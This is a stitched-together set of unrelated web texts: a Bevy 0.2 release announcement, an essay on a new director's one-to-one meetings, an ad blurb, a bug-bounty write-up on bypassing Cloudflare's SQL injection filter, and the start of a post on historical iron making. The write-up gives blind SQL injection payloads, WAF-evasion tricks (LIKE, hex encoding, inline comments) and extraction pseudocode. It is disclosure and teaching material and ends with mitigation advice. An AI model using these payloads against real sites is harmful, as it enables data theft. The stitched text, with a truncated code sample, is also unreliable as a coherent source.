  </div><div><p>A month after the initial Bevy release, and thanks to <strong>87</strong> contributors, <strong>174</strong> pull requests, and our <a href="https://github.com/sponsors/cart"><strong>generous sponsors</strong></a>, I'm happy to announce the <strong>Bevy 0.2</strong> release on <a href="https://crates.io/crates/bevy">crates.io</a>!</p>
<p>For those who don't know, Bevy is a refreshingly simple data-driven game engine built in Rust. You can check out <a href="https://bevyengine.org/learn/book/getting-started/">Quick Start Guide</a> to get started. Bevy is also free and open source forever! You can grab the full <a href="https://github.com/bevyengine/bevy">source code</a> on GitHub.</p>
<p>Here are some of the highlights from this release:</p>
<h2 id="async-task-system">Async Task System</h2>

<p>Bevy uses multi-threading throughout the engine: ECS scheduling, asset loading, rendering, etc. Before this release it used <a href="https://github.com/rayon-rs/rayon">Rayon</a> for almost all of these tasks. Rayon is nice because it is generally as simple as calling <code>some_list.par_iter().for_each(|x| do_something(x))</code>. Rayon then automatically breaks the <code>for_each</code> into tasks and runs them on as many cores as it can. Rayon is a great choice if you want to easily parallelize code, but it has the downside of being pretty cpu-hungry.</p>
<p>Bevy (and a number of other rust game engines and ecs frameworks using rayon) have received feedback that they were overly cpu hungry / usage was not proportional to "real" work done.</p>
<p>We decided to resolve this problem by building a custom async-friendly task system, which enables the creation of context-specific task pools. For example, you might have separate pools for compute, IO, networking, etc. This also gives us the flexibility to load balance work appropriately according to work type and/or priority. The cpu usage wins have been huge:</p>
<h3 id="total-combined-percent-cpu-usage-8-core-machine-smaller-is-better">Total Combined Percent CPU Usage - 8 Core Machine (smaller is better)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy_tasks_1.svg" alt="threading cpu usage 8 core"></p>

<h2 id="initial-web-platform-support">Initial Web Platform Support</h2>
<p>authors: @smokku</p>
<p>(A subset of) Bevy now runs on the web using WebAssembly/WASM! Specifically, Bevy apps can run Bevy ECS schedules, react to input events, create an empty canvas (using winit), and a few other things. This is a huge first step, but it is important to call out that there are still a number of missing pieces, such as 2D/3D rendering, multi-threading, and sound. </p>
<p>Those limitations haven't stopped @mrk-its from building the first WASM Bevy game!</p>
<h3 id="bevy-robbo-playable-here"><a href="https://github.com/mrk-its/bevy-robbo">bevy-robbo</a> (<a href="https://s3.eu-central-1.amazonaws.com/mrk-public/bevy-robbo/index.html">playable here</a>)</h3>
<p><img src="https://bevyengine.org/news/bevy-0-2/bevy-robbo.png" alt="bevy-robbo"></p>
<p>They use Bevy for game logic and cleverly work around the render limitations by passing ASCII art game state from <a href="https://github.com/mrk-its/bevy-robbo/blob/master/src/systems/js_render.rs">this Bevy system</a> to <a href="https://github.com/mrk-its/bevy-robbo/blob/master/assets/render.js">this JavaScript function</a>. </p>

<h2 id="parallel-queries">Parallel Queries</h2>
<p>authors: @GrantMoyer</p>
<p>Bevy ECS Queries are a flexible way to retrieve data from the Entity Component System. Systems that <em>use</em> queries already run in parallel, but before this change the queries themselves could not be <em>iterated</em> in parallel. <strong>Bevy 0.2</strong> adds the ability to easily iterate queries in parallel:</p>
<pre><code><span>fn </span><span>system</span><span>(</span><span>pool</span><span>: </span><span>Res</span><span>&lt;</span><span>ComputeTaskPool</span><span>&gt;</span><span>, </span><span>mut </span><span>query</span><span>: </span><span>Query</span><span>&lt;&amp;</span><span>mut</span><span> Transform</span><span>&gt;) {</span><span>
    query</span><span>.</span><span>iter</span><span>().</span><span>par_iter</span><span>(</span><span>32</span><span>).</span><span>for_each</span><span>(&amp;</span><span>pool</span><span>, |</span><span>mut </span><span>transform</span><span>| {</span><span>
      transform</span><span>.</span><span>translate</span><span>(</span><span>Vec3</span><span>::</span><span>new</span><span>(</span><span>1.0</span><span>, </span><span>0.0</span><span>, </span><span>0.0</span><span>));
    });
}
</span></code></pre>
<p>This provides a nice functional api (similar to Rayon) that runs on top of the new <code>bevy_tasks</code> system. It breaks the query up into 32 "batches" and runs each batch as a different task in the bevy task system. </p>
<h2 id="transform-system-rewrite">Transform System Rewrite</h2>
<p>authors: @MarekLg</p>
<pre><code><span>// old
</span><span>fn </span><span>system</span><span>(</span><span>translation</span><span>: &amp;</span><span>Translation, </span><span>rotation</span><span>: &amp;</span><span>Rotation, </span><span>scale</span><span>: &amp;</span><span>Scale</span><span>) {
  </span><span>println!</span><span>("</span><span>{} {} {}</span><span>",</span><span> translation</span><span>.</span><span>0</span><span>,</span><span> rotation</span><span>.</span><span>0</span><span>,</span><span> scale</span><span>.</span><span>0</span><span>);
}

</span><span>// new
</span><span>fn </span><span>system</span><span>(</span><span>transform</span><span>: &amp;</span><span>Transform</span><span>) {
  </span><span>println!</span><span>("</span><span>{} {} {}</span><span>",</span><span> transform</span><span>.</span><span>translation</span><span>(),</span><span> transform</span><span>.</span><span>rotation</span><span>(),</span><span> transform</span><span>.</span><span>scale</span><span>());
}
</span></code></pre>
<p>Bevy's old transform system used separate <code>Translation</code>, <code>Rotation</code>, and <code>Scale</code> components as the "source of truth". Users modified with these components in their systems, after which they were synced to a <code>LocalTransform</code> component, which was in turn synced to a global <code>Transform</code> component, taking hierarchy into account. This was nice for a couple of reasons:</p>
<ul>
<li>Slightly more cache efficient to retrieve individual components like <code>Translation</code> (because less data needs to be accessed)</li>
<li>Theoretically more parallel-friendly. Systems that only access <code>Translation</code> won't block systems accessing <code>Rotation</code>.</li>
</ul>
<p>However this approach also has some pretty serious downsides:</p>
<ul>
<li>The "individual components" are the source of truth, so <code>LocalTransform</code> is out of date when user systems are running. If an up to date "full transform" is needed, it must be manually constructed by accessing all three components.</li>
<li>Very hard to reason about. There are 5 components users need to think about and they all interact with each other differently.</li>
<li>Setting a Transform to a specific matrix value (ex: <code>Mat4::look_at()</code>) was extremely cumbersome, and the value would be immediately overwritten unless the user explicitly disabled component syncing.</li>
</ul>
<p>Given these issues, we decided to move to a single unified local-to-parent <code>Transform</code> component as the source of truth, and a computed <code>GlobalTransform</code> component for world-space transforms. We think this api will be much easier to use and to reason about. <a href="https://gist.github.com/joeante/79d25ec3a0e86436e53eb74f3ac82c0c">Unity is also considering a similar Transform rework for their ECS</a> and a lot of discussion on this topic happened in this <a href="https://community.amethyst.rs/t/legion-transform-design-discussion">Amethyst Forum Thread</a>.</p>
<h2 id="joystick-gamepad-input">Joystick/Gamepad Input</h2>
<p>authors: @simpuid</p>
<p>The Bevy Input plugin now has cross-platform support for most controllers thanks to the <a href="https://gitlab.com/gilrs-project/gilrs">gilrs</a> library!</p>
<pre><code><span>fn </span><span>button_system</span><span>(</span><span>gamepads</span><span>: </span><span>Res</span><span>&lt;</span><span>Vec</span><span>&lt;</span><span>Gamepad</span><span>&gt;&gt;</span><span>, </span><span>button_input</span><span>: </span><span>Res</span><span>&lt;</span><span>Input</span><span>&lt;</span><span>GamepadButton</span><span>&gt;&gt;) {

            </span><span>println!</span><span>("</span><span>Pressed right trigger!</span><span>");
        }
    }
}
</span></code></pre><h2 id="bevy-ecs-performance-improvements">Bevy ECS Performance Improvements</h2>
<p>authors: @cart</p>
<h3 id="generational-entity-ids">Generational Entity IDs</h3>
<p>We changed Entity IDs from being random UUIDs to incrementing generational indices. Random UUIDs were nice because they could be created anywhere, were unique across game runs, and could be safely persisted to files or reused across networks. I was really hoping we could make them work, but they ended up being too slow relative to the alternatives. The randomness had a measurable cost and entity locations had to be looked up using a hash map.</p>
<p>By moving to generational indices (we use the hecs implementation), we can directly use entity ids as array indices, which makes entity location lookups lightning fast.</p>
<h3 id="read-only-queries">Read Only Queries</h3>
<p>I implemented "read only" traits for queries that don't mutate anything. This allows us to guarantee that a query won't mutate anything.</p>
<h3 id="removed-locking-from-world-apis">Removed locking from World apis</h3>
<p>This gives us a really nice speed boost. We can do this safely due to a combination of the new "read only queries" and changing World mutation apis to be a mutable World borrow.</p>
<p>This is not yet enabled for <code>Queries</code> in systems because a system could have multiple <code>Queries</code>, which could be simultaneously accessed in a way that doesn't make mutable access unique. I think thats a solve-able problem, but it will take a bit more work. Fortunately "for-each" systems don't have any collision risk, so we now use lock-less queries there.</p>
<h3 id="direct-component-lookup-in-nanoseconds-smaller-is-better">Direct component lookup (in nanoseconds, smaller is better)</h3>
<p>As a result of these optimizations, direct component lookup is <em>much</em> faster than it used to be:</p>
<p><img src="https://bevyengine.org/news/bevy-0-2/get_component.svg" alt="get_component graph"></p>
<p>Note that this benchmark used <code>world.get::&lt;T&gt;(entity)</code>. <code>query.get::&lt;T&gt;(entity)</code> should have results similar to the <code>hecs</code> results because it still uses a lock. Eventually I'm hoping that we can remove locks from system queries too.</p>

    <date>17 September 2020</date>
      <p>When I joined the Financial Times as Technical Director for FT.com, I inherited a team of around 50 engineers. One of the first things I did was meet each of them for a one-to-one. I was initially resistant, but it was extremely valuable, I’m glad I did it, and I would definitely do it again in a future role.</p>

<h2 id="my-mentors-advice-about-the-content-of-the-meeting">My mentor’s advice about the content of the meeting</h2>

<p>The idea was suggested to me by a mentor, who’d been advised to do it by <em>his</em> mentor, a Rear Admiral, who said this was something you should do whenever you have a team of fewer than 150 people. My mentor gave me some tips:</p>

<ul>
  <li>Be clear about whether you will take action or whether this is for information only.</li>
  <li>This should mostly be about listening – you should talk for maybe 5 minutes and they should talk for 25.</li>
  <li>It’s to find out what’s going well and what’s not going well.</li>
  <li>It’s informal, but make sure it’s in an enclosed meeting room so that people feel they can speak freely.</li>
  <li>Sometimes it will be quite boring, sometimes you may just learn a lot about someone’s family or hobbies, but that is useful from a getting to know people/relationship-building perspective and it means that you know some things about that person.</li>
  <li>Aim is to get a bit about their background, their priorities and their pressures.</li>
</ul>

<h2 id="making-time-was-hard">Making time was hard</h2>

<p>I was initially resistant because of the time commmitment. With a team of ~50, that’s a lot of hours, and I was also working four days a week so each meeting takes up a greater proportion of time. However, once I’d made the decision to do this and announced my intention, it was important to me to follow through, so I made sure to make time.</p>

<p>I scheduled four of these 1:1s a week, starting with the people reporting directly to me and then on down the management chain.</p>

<h2 id="i-ran-each-meeting-in-the-same-way">I ran each meeting in the same way</h2>

<p>Firstly I ran through everything I planned to cover, and then stepped through it.</p>


<ul>
  <li>I am asking the same questions to everyone</li>
  <li>This is information for me only to get an idea of themes and how things are going; I’m not explicitly planning to take action on anything we discuss, so if something comes up that I need to take action on, let’s make sure we discuss that after this meeting</li>
  <li>This is confidential. If you say something about someone else I’m not going to go and tell them. I may report on ‘what people are saying’, but I’ll say ‘the engineers feel’ or ‘an engineer said’; I won’t say “[Your name] said…”</li>
</ul>

<h3 id="what-were-going-to-discuss">What we’re going to discuss</h3>

<ul>
  <li>First I’ll introduce myself, and tell you a bit about my background</li>
  <li>Then, if you like, I’d love you to tell me a bit about yourself – as much or as little as you feel like sharing</li>
  <li>Then we’ll discuss the following questions:</li>
</ul>

<ol>
  <li>What do you think the most important things we should be doing over the next year?</li>
  <li>What will get in the way of us doing that?</li>
  <li>What’s going well, i.e. what should we make sure we don’t change?</li>
  <li>Is there anything you think I should know about?</li>
</ol>

<h2 id="is-there-anything-i-should-know-about">Is there anything I should know about?</h2>

<p>When I asked this question I talked a bit about why I was asking. I explained that I might not necessarily see or know things that may seem apparent to them, and while they should always feel able to bring things to me, now was a good opportunity to do so. It was an opportunity to make sure I’ve heard what’s important to you, what things should change and what things should stay the same.</p>

<p>This question always elicited very interesting responses, from organisational issues, to personal information people felt it was valuable for me to know about them.</p>

<h2 id="i-told-them-what-i-was-planning-to-ask-in-advance">I told them what I was planning to ask in advance</h2>

<p>I put all the information in the meeting invite.</p>

<div>
<p>I mentioned that I wanted to have a chat with everyone on FT.com to understand how things are going, does this time suit you for this?</p>

<p>The meeting agenda is the same for everyone; a quick intro and then the following questions (I'll go through this in the meeting too):</p>

<ul>
<li>What do you think the most important things we should be doing over the next year?</li>
<li>What will get in the way of us doing that?</li>
<li>What’s going well, i.e. what should we make sure we don’t change?</li>
<li>Is there anything you think I should know about?</li>
</ul>

<p>Thanks,</p>
<p>Anna</p>

<p>Some people did not read the meeting invite and came with no idea what the meeting was about. Some people had fully prepared and written notes that they then read out to me. Actually people having prepared sometimes was less useful, because sometimes it led the conversation to solutions rather than problems. However it was great that people had really given it some thought.</p>

<h2 id="making-notes-felt-too-much-like-a-promise">Making notes felt too much like a promise</h2>

<p>Each meeting was half an hour. In the very first one, I made notes in a notebook, but I realised that created an implicit commitment that I was going to take action on everything that was said, even though I had said it was information only.</p>

<p>However, I do not have a very good memory, so for all the subsequent ones I made a few notes after each meeting of key themes. This meant I couldn’t do more than two in a row or go straight into another meeting, so it made scheduling slightly harder. These days, people are much more aware of the shorter meeting approach so if doing this again, I’d go for the ‘therapy hour’ – 25 minutes for conversation then 5 minutes for me to make the notes.</p>

<h2 id="introducing-myself">Introducing myself</h2>

<p>In my intro, I gave a potted career history. Starting from my degree in philosophy, and my first career in <a href="https://www.barringtonstoke.co.uk/">children’s book publishing</a>, through teaching myself to code, my <a href="https://www.hw.ac.uk/study/uk/postgraduate/information-technology-software-systems.htm">masters in Software Systems</a> and then my 15+ year career in programming, infrastructure and operations, technical architecture, and my previous role as <a href="https://www.annashipman.co.uk/jfdi/a-year-in-the-life-os-lead.html">Open Source lead</a>. I also talked about what appealed to me about the job as Technical Director at the FT.</p>

<p>I said roughly the same thing to everyone. I don’t normally introduce myself and give my background, but in this case I thought that as a new Tech Director most of them would not be working closely with me, and I would not be contributing code, so it was worth giving my credentials.</p>

<p>My mentor had suggested I also say something personal. I think he intended something like “married with two children” (or whatever), but instead, I tried to give a different kind of personal detail, something about my interests. I tried to come up with a different one for each conversation, for example something about my <a href="https://twitter.com/annashipman/status/1043917006477643777">cross-stitch hobby</a>.</p>

<p>This part was the hardest part for me, because prior to this I had generally enjoyed keeping a clear boundary between work stuff and personal stuff, so that definitely didn’t cover talking about cross-stitch, or my home life, on a first meeting. However, I had been trying to bring more of my personal self to work, and this part of the intro did lead to some really interesting conversations and I think helped make a better connection.</p>

<p>Of course, these days, when we are all at home, my personal life is in meetings with me, so it’s good I’d already started on that journey!</p>

<p>Giving so much information in my introduction also allowed the other person to introduce themselves how they wanted. Some talked career history, some focused on their hobbies, others were really open about their lives and aspirations.</p>

<h2 id="i-am-so-glad-i-did-this">I am so glad I did this</h2>

<p>My mentor was wrong about one thing –&nbsp;none of the conversations were boring.</p>

<p>In my first few months in the new job, I often felt really stretched for time, but I never regretted a single one of these meetings; it was always extremely interesting, my team are brilliant and it was great to meet them one on one, and each conversation always contained some valuable information.</p>

<p>There were two very valuable things about this for me.</p>

<p>The first was getting an idea of what change was needed. These meetings gave me a brilliant insight that wasn’t available elsewhere. Patterns started emerging very quickly, and formed the basis of our <a href="https://medium.com/ft-product-technology/the-difficult-teenage-years-setting-tech-strategy-after-a-launch-7f42eb94a424">tech strategy</a>.</p>

<p>The second was building relationships. A lot of the people I had 1:1s with I would not have come into contact with during the course of the ordinary working week. It would have taken time to meet everyone at socials, and it wouldn’t have been the same quality of conversation. I still feel, two years on, that I know a bit about all the people I had those conversations with, which has felt to me like a good foundation for our subsequent conversations.</p>

<p>It was also good, as someone who is a bit shy, to have names to faces quite quickly and people to say hello to when walking round the office.</p>

<h2 id="was-it-useful-for-my-team">Was it useful for my team?</h2>

<p>About a year later, I asked some of the people with whom I’d had these conversations whether they’d been useful (in an anonymous form).</p>

<p>All of the people who responded said they found the conversation valuable, and some of their comments were:</p>

<ul>
  <li>“It broke down barriers and helped me feel less intimidated about approaching you, whether to talk about work or just to have a general chit chat. You are a very busy person who I wouldn’t ever work with directly so it was good to feel that you knew I existed.”</li>
  <li>“There is hardly any opportunity for me to talk to people in higher position like you except when the team has a big problem. The 1:1 was really casual and I felt really comfortable talking to you. It was a good time to know what kind of person you are. If we didn’t do the 1:1, the answer of the question below “Do you feel able to raise issues with me?” would be “No”.”</li>
  <li>“We sat down when you first started and it was nice to get some one-to-one time because it’s not often you get to do that with a Technical Director. It was nice to raise issues but for me, it was more of an opportunity to understand if I could trust you in the future with raising issues. Raising issues can be difficult and scary so it’s important to know if the person you are raising them to is receptive.”</li>
  <li>“It really showed that you cared about us as humans, and how we fit with the rest of the team. It was also a great opportunity to get to know you”</li>
  <li>“I think often of that conversation”</li>
</ul>

<h2 id="did-it-make-them-feel-more-able-to-raise-issues-with-me">Did it make them feel more able to raise issues with me?</h2>

              <h4>Visual rank of your website is as important as your SEO rank.</h4>
              <p>Users make lasting judgments about a website’s appeal within a split second.  This first impression is influential enough to later affect their opinions of a site’s usability and trustworthiness.</p>

              <h4>What is Visual Mind Score and why it matters ?</h4>
              <p>For too long, aesthetics of a website has been dismissed as a superficial concern. That is a mistake. As latest research demonstrates ( See recommended ref) , the visual appeal of a website is tied up with far weightier issues, such as functionality and trustworthiness.</p>
              <p>Have you “fast-tested” your website? Remember, you have only fifty milliseconds to impress your visitors. Flash your website to people for a very short period of time and then ask for their opinion. That is the opinion that matters.</p>
              <p>Visual Mind score – provides you with a qualitative score about that first impression. It can help you evaluate your website aesthetics and make improvements.</p>

        <!-- <h1 class="post-title">How I bypassed Cloudflare's SQL Injection filter</h1> -->

        <section>
            <p>In late 2018 I was tasked with performing a Web Application security assessment
for a large client.
After running the standard scans with automated tools, something interesting
came up: a possible SQL injection which couldn’t be exploited using the tool.
The reason: Cloudflare’s WAF and more specifically its SQL Injection filter.</p>

<h4 id="details-about-the-application">Details about the application</h4>
<p>The application was a generic website written in PHP with MySQL as the backend
DBMS. The vulnerable page submitted a POST request with multipart form body
data to the /index.php endpoint. I honestly don’t remember the use of the form
and it doesn’t really matter for the writeup. The POST request looked like this:</p>

<figure><pre><code data-lang="http"><span>POST</span> <span>/index.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>******</span>
<span>Connection</span><span>:</span> <span>close</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>Content-Type</span><span>:</span> <span>multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3</span>

--dc30b7aab06d4aff91d4285d7e60d4f3--</code></pre></figure>

<p>The unsanitized parameter at X-MARK can be used to inject arbitrary values at
the place of the WHERE clause of an SQL SELECT query.
For example, if the above data was sent as the body of the POST request, the
SQL query which would be executed on the server would look something like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>X</span><span>-</span><span>MARK</span><span>;</span></code></pre></figure>

<p>The technique typically used for this kind of injection is a Time-based Blind
SQL injection. The problem was, that Cloudflare would recognize these kinds of
injections and block them on the spot. No matter how complicated I tried to make
the query or how many sqlmap tamper scripts I used, Cloudflare was always there.</p>

<p>To overcome this issue, I used an observation I made while manually testing for
SQL injections on the same request:
I had noticed that when I tried to inject code that resulted in something close
to the following SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'a'</span><span>;</span></code></pre></figure>

<p>the web server responded with status 200 OK.
When I tried to inject code that resulted in something close to this SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'b'</span><span>;</span></code></pre></figure>

<p>the server responded with status 500 Internal Server Error.</p>

<p>In other words when the SQL query in the backend did NOT return results, the web
server complained and crashed (probably because the backend code tried to access
an item in the returned list whose index was out of range).
This gave me an idea: writing a script that compared a character picked from the
name of the required DBMS entity and sequentially compared it with all
characters. The idea was, if the two characters matched, the server would return
a 200 OK status, else it would return a 500 Internal Server Error status and I
would have to compare the requested character with the next character in my
list.</p>

<h4 id="first-try">First Try</h4>
<p>My thinking was that if a wanted to find the first second character of the name
of the fifth table (as they are listed in information_schema.tables), I would
start by asking MySQL if that character is equal to ‘a’ and if not I would
continue with ‘b’, ‘c’ etc. I would start by inject the following string (for
comparison with ‘a’):</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>which would result in the following SQL query to be executed on the server:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span>
<span>WHERE</span> <span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>When I found the table name to be t1 for example, I was to brute force its
columns’ names with the following starting injection:</p>

<p><em>INJECTION 1</em></p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>and then actually get values out of column c1 of table t1 by starting with the
following injection:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>c1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>t1</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The idea was good, but Cloudflare would complain about the ‘=’ sign. The
injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span> <span>'b'</span></code></pre></figure>

<p>would get blocked by Cloudflare’s WAF. After a bit of fiddling, I came up with
the following request that bypassed the ‘=’ restriction:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>This means that the initial injection <em>INJECTION 1</em> would become:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="second-try">Second Try</h4>
<p><em>INJECTION 1</em> was still not ready to go. Cloudflare would still complain about stuff.
More specifically the injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>would still get blocked, not because of the LIKE keyword, but because of the ‘a’
character. Comparing plain strings to anything was not allowed. To overcome this
issue I came up with the following injection that went through undetected by the
WAF:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>The above injection sends the character ‘a’ as the hex-encoded value ‘0x61’
which still allows it to work:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'a'</span></code></pre></figure>

<p>still returns True, and</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>passes through undetected and returns False.</p>

<p>The resulting <em>INJECTION 1</em> now looks like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="third-try">Third Try</h4>
<p>The third obfuscation I had to enroll was a multi-line comment addition between
SQL query keywords. Cloudflare would block queries like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>but with a multi-line comment trick, the new query would go through undetected:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span><span>/*trick comment*/</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span>
<span>FROM</span><span>/*trick comment*/</span> <span>t1</span>
<span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>Thus, applying this method on <em>INJECTION 1</em>, would make it look like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span><span>/*trick comment*/</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span><span>/*trick comment*/</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The above injection is in its final form and when passed as a form value to the
vulnerable web application the web server will reply with a 200 OK if the
character ‘a’ matches the first character of the first column’s name of table
t1.</p>

<h4 id="full-speed-ahead">Full Speed Ahead</h4>
<p>To make the retrieving of table contents from the application’s database easier
I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:</p>

<figure><pre><code data-lang="python"><span># assert names of columns and table name is known
</span><span>alphabet</span> <span>=</span> <span>[</span><span>a</span><span>,</span><span>b</span><span>,</span><span>c</span><span>,...,</span><span>y</span><span>,</span><span>z</span><span>]</span>
<span>characterPosition</span> <span>=</span> <span>1</span> <span># the position of the character we are bruteforcing
</span><span>for</span> <span>rowNumber</span> <span>in</span> <span>[</span><span>0</span><span>,</span><span>20</span><span>]:</span>
  <span>for</span> <span>columnName</span> <span>in</span> <span>columns</span><span>:</span>
    <span>for</span> <span>character</span> <span>in</span> <span>alphabet</span><span>:</span>
      <span>sqlInjection</span> <span>=</span> <span>'''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
        FROM/*trick comment*/ tableName
        LIMIT {rowNumber}, 1
        )
      '''</span>

      <span>inject</span> <span>sqlInjection</span> <span>is</span> <span>POST</span> <span>request</span> <span>body</span>
      <span>if</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>200</span><span>:</span>
        <span>result</span> <span>+=</span> <span>character</span>
        <span>recurse</span> <span>function</span> <span>with</span> <span>characterPosition</span><span>++</span>
      <span>elif</span> <span>response</span><span>.</span><span>status</span> <span>==</span> <span>500</span><span>:</span>
        <span>continue</span> <span>with</span> <span>next</span> <span>character</span> <span>in</span> <span>alphabet</span>

      <span>return</span> <span>result</span></code></pre></figure>

<p>And this is how I bypassed Cloudflare WAF’s SQL injection protection. I got a
free t-shirt and a place in <a href="https://hackerone.com/gskourou">Cloudflare’s HoF</a>.</p>

<h4 id="mitigation">Mitigation</h4>
<p>Cloudlfare reviewed and fixed the vulnerability a few days after my report.</p>
<p>The safest way to mitigate SQL injections on your databases is prepared
statements. These come in most database interaction libraries for most
languages. You can find a full list of ways to mitigate SQL injections at
<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP</a>.
It is my opinion that if developers take good care to apply security measures
on their applications, WAFs are most of the times unnecessary. All you need to
do is sanitize the users’ input properly.</p>

<p>This week we are starting a four-part look at pre-modern iron and steel production.  As with our series on farming, we are going to follow the train of iron production from the mine to a finished object, be that a tool, a piece of armor, a simple nail, a weapon or some other object.  <strong>And I want to stress that broad framing</strong>: iron was made into more things than <em>just</em> swords (although swords are cool).  If you are here wondering how you go from iron-bearing rocks to a sword, these posts will tell you, but they will equally get you from those same rocks to a nail, or a workman’s hammer, or a sawblade, or a pot, or a decorative iron spiral, or a belt-buckle, or any other of a multitude of things that might be produced in iron.</p>



<p>Iron production is a unique topic in one key way.  If the problem with <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farmers </a>is that the popular understanding of the past (either historical or fantastical) renders them <a href="https://acoup.blog/2019/07/12/collections-the-lonely-city-part-i-the-ideal-city/">effectively invisible</a> – as indeed, it tends to render <em>most</em> ancient forms of production invisible – <strong>iron-working is tremendously visible, but in a series of motifs that are almost completely</strong> <em><strong>wrong</strong></em>.  Iron is treated as rare when it is common, melted in societies that almost certainly lack the furnaces to do so; swords are cast when they should be forged, quenched in ways that would ruin them and the work of the iron-worker is represented as a solitary activity when every stage of iron-working, when done at any kind of scale, was a team job (many modern traditional blacksmiths work alone, often as a hobby; ancient smiths generally did not).  The popular depiction is so consistently wrong that it doesn’t really even provide a firm basis for correction.  <strong>We are going to have to start over, from the beginning</strong>.</p>



